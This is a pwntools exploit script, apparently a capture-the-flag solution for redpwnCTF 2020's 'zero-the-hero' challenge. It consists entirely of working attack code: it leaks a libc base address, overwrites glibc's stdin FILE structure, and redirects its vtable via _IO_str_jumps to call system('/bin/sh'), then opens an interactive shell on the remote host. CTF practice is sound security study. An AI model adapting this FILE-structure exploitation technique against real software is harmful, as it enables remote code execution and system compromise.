from pwn import *

context.log_level = 'debug'

#p = process('./zero-the-hero')
p = remote('2020.redpwnc.tf', 31643)
e = ELF('./zero-the-hero')
l = e.libc

p.sendlineafter('?\n', str(0x300000))
p.recvuntil('0x')
libc = int(p.recv(12), 16) + 0x300ff0

binsh = libc+next(l.search('/bin/sh'))
_io_str_jumps = libc+0x3e8360

log.info('libc : ' + hex(libc))

p.sendlineafter('?\n', str(0x300ff0+l.sym['_IO_2_1_stdin_']+0x38))
p.recvuntil('?\n')

pay = p64(libc+0x3eba00)*2+p64(libc+0x3eba30+0x800)
p.send(pay)

pay = p64(0xfbad2080)
pay += p64(libc+0x3eba30)*3
pay += p64(0)+p64((binsh-100)/2) # write base & write ptr
pay += p64(libc+0x3eba00) # write end
pay += p64(0)+p64((binsh-100)/2) # buf base & buf end
pay += p64(0)*5+p64(0x0000001000000000)
pay += p64(0xffffffffffffffff)+p64(0)+p64(libc+0x3ed8d0)
pay += p64(0xffffffffffffffff)+p64(0)+p64(libc+0x3ebae0)
pay += p64(0)*3+p64(0x00000000ffffffff)+p64(0)*2+p64(_io_str_jumps-0x10)
pay += p64(libc+l.sym['system'])
p.send(pay)

p.interactive()
